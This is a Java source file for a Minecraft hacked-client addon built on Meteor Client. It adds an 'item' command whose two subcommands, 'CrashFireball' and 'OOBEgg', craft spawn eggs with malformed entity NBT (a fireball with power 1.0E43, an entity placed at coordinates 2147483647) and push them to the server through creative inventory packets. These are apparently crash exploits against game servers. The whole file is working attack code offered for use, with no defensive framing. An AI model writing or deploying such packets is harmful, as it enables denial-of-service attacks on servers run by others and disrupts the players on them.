package uwu.taxevasion.allahhack.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.systems.commands.Command;
import net.minecraft.command.CommandSource;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class ItemCommand extends Command {

    public ItemCommand() {
        super("item", "gives you an item", "item", "i");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal("CrashFireball").executes(ctx -> {
            ItemStack CrashFireball = new ItemStack(Items.CAVE_SPIDER_SPAWN_EGG);
            NbtCompound tag = new NbtCompound();
            NbtList power = new NbtList();
            power.add(NbtDouble.of(1.0E43));
            power.add(NbtDouble.of(0));
            power.add(NbtDouble.of(0));
            tag.putString("id", "minecraft:small_fireball");
            tag.put("power", power);
            CrashFireball.setSubNbt("EntityTag", tag);
            CreativeInventoryActionC2SPacket balls = new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, CrashFireball);
            mc.getNetworkHandler().sendPacket(balls);
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("OOBEgg").executes(ctx -> {
            ItemStack gato = new ItemStack(Items.CAT_SPAWN_EGG);
            NbtCompound tag = new NbtCompound();
            NbtList pos = new NbtList();
            pos.add(NbtDouble.of(2147483647));
            pos.add(NbtDouble.of(2147483647));
            pos.add(NbtDouble.of(2147483647));
            tag.put("Pos", pos);
            gato.setSubNbt("EntityTag", tag);
            CreativeInventoryActionC2SPacket elgato = new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, gato);
            mc.getNetworkHandler().sendPacket(elgato);
            return SINGLE_SUCCESS;
        }));
    }
}
